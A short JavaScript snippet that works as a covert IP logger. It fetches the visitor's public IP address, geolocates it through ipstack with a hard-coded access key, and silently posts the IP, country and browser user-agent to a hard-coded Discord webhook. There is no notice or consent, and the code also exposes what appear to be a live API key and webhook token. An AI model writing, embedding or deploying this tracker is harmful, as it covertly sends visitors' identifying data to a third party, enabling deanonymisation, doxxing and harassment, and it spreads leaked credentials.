var ip = '';
var country = '';
var userAgent = navigator.userAgent;

fetch('https://api.ipify.org/?format=json')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    ip = data.ip;
    return fetch('https://api.ipstack.com/' + ip + '?access_key=4179f7bc82b738d5a2a3f0e0d7acf2db');
  })
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    country = data.country_name;
    var webhook = 'https://discord.com/api/webhooks/1125085555022119014/8zPxC6vE53eCcrp4uCi-3uemuZiuDxcu4W-L5JPIZa1GLnyTLgUU_Z5bLax7kfPNB-Xk';
    var message = {
      content: 'IP: ' + ip + '\nCountry: ' + country + '\nConsole: ' + userAgent
    };

    return fetch(webhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    });
  })
  .catch(function(error) {
    console.log('Error:', error);
  });